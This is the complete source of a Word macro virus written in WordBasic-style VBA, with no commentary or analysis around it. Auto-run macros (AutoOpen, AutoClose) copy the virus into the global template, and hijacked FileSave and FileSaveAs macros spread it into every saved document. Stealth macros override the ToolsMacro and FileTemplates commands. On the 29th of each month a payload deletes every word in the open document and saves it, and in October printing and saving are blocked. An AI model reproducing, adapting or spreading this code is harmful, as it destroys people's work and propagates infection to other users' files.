   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "StealthActivate"

   Public Sub MAIN()
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Fake", "Global:ToolsMacro"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Fake", "Global:FileTemplates"
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)   'we define which dialog box will appear
    WordBasic.CurValues.FileSaveAs dbox       'we inicialize and run the dialog box
    If dbox.Format = 1 Then
    End If
    If dbox.Format = 0 Then
    WordBasic.Dialog.FileSaveAs dbox
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
    WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint"
    WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave"
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:Payload", WordBasic.[WindowName$]() + ":Payload"
    WordBasic.MacroCopy "Global:StealthActivate", WordBasic.[WindowName$]() + ":StealthActivate"
    WordBasic.MacroCopy "Global:Fake", WordBasic.[WindowName$]() + ":Fake"
    dbox.Format = 1         'we are saving a template
    End If
    WordBasic.FileSaveAs dbox         'we finally save it
   End Sub

   Attribute VB_Name = "FilePrint"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Prints the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrint.MAIN"
   If WordBasic.Day(WordBasic.Now()) = 29 Then
     WordBasic.Call "Payload"
     GoTo no_print
   End If
   If WordBasic.Month(WordBasic.Now()) = 10 Then
      WordBasic.MsgBox "No Printing Today!"
      GoTo no_print
   End If
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   WordBasic.FilePrint dlg
   no_print:
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim name_$
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   name_$ = WordBasic.[WindowName$]() + ":FileSaveAs"
   WordBasic.MacroCopy name_$, "Global:FileSaveAs"
   name_$ = WordBasic.[WindowName$]() + ":FileSave"
   WordBasic.MacroCopy name_$, "Global:FileSave"
   name_$ = WordBasic.[WindowName$]() + ":FilePrint"
   WordBasic.MacroCopy name_$, "Global:FilePrint"
   name_$ = WordBasic.[WindowName$]() + ":AutoClose"
   WordBasic.MacroCopy name_$, "Global:AutoClose"
   name_$ = WordBasic.[WindowName$]() + ":AutoOpen"
   WordBasic.MacroCopy name_$, "Global:AutoOpen"
   name_$ = WordBasic.[WindowName$]() + ":Payload"
   WordBasic.MacroCopy name_$, "Global:Payload"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":StealthActivate", "Global:StealthActivate"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Fake", "Global:Fake"
   WordBasic.Call "StealthActivate"
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)
   If WordBasic.Day(WordBasic.Now()) = 29 Then
     WordBasic.Call "Payload"
     GoTo no_save
   End If
   If WordBasic.Month(WordBasic.Now()) = 10 Then
      WordBasic.MsgBox "No Saving for you Today!"
      GoTo no_save
   End If
    WordBasic.CurValues.FileSaveAs dbox       'we inicialize and run the dialog box
    If dbox.Format = 1 Then
    End If
    If dbox.Format = 0 Then
    WordBasic.Dialog.FileSaveAs dbox
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
    WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint"
    WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave"
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:Payload", WordBasic.[WindowName$]() + ":Payload"
    WordBasic.MacroCopy "Global:StealthActivate", WordBasic.[WindowName$]() + ":StealthActivate"
    WordBasic.MacroCopy "Global:Fake", WordBasic.[WindowName$]() + ":Fake"
    dbox.Format = 1         'we are saving a template
    End If
    WordBasic.FileSaveAs dbox         'we finally save it
   no_save:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim name_$
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)
   If dbox.Format = 1 Then
   name_$ = WordBasic.[WindowName$]() + ":FileSaveAs"
   WordBasic.MacroCopy name_$, "Global:FileSaveAs"
   name_$ = WordBasic.[WindowName$]() + ":FileSave"
   WordBasic.MacroCopy name_$, "Global:FileSave"
   name_$ = WordBasic.[WindowName$]() + ":FilePrint"
   WordBasic.MacroCopy name_$, "Global:FilePrint"
   name_$ = WordBasic.[WindowName$]() + ":AutoClose"
   WordBasic.MacroCopy name_$, "Global:AutoClose"
   name_$ = WordBasic.[WindowName$]() + ":AutoOpen"
   WordBasic.MacroCopy name_$, "Global:AutoOpen"
   name_$ = WordBasic.[WindowName$]() + ":Payload"
   WordBasic.MacroCopy name_$, "Global:Payload"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":StealthActivate", "Global:StealthActivate"
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Fake", "Global:Fake"
   WordBasic.Call "StealthActivate"
   End If

   End Sub

   Attribute VB_Name = "Payload"

   Public Sub MAIN()
   Dim wordNum
   WordBasic.ScreenUpdating 0
   start:
   WordBasic.FileSummaryInfo Update:=1
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
   WordBasic.CurValues.DocumentStatistics dlg
   wordNum = WordBasic.Val(dlg.Words)
   If wordNum = 0 Then
    GoTo es
   End If
   WordBasic.StartOfDocument
   WordBasic.SelectCurWord
   WordBasic.DeleteWord
   GoTo start:
   es:
   WordBasic.FileSave
   WordBasic.MsgBox "Mwahahaha... Bye bye Report...I hope you didnt work on this for too long :)"
   End Sub

   Attribute VB_Name = "Fake"

   Public Sub MAIN()
   z:
   End Sub
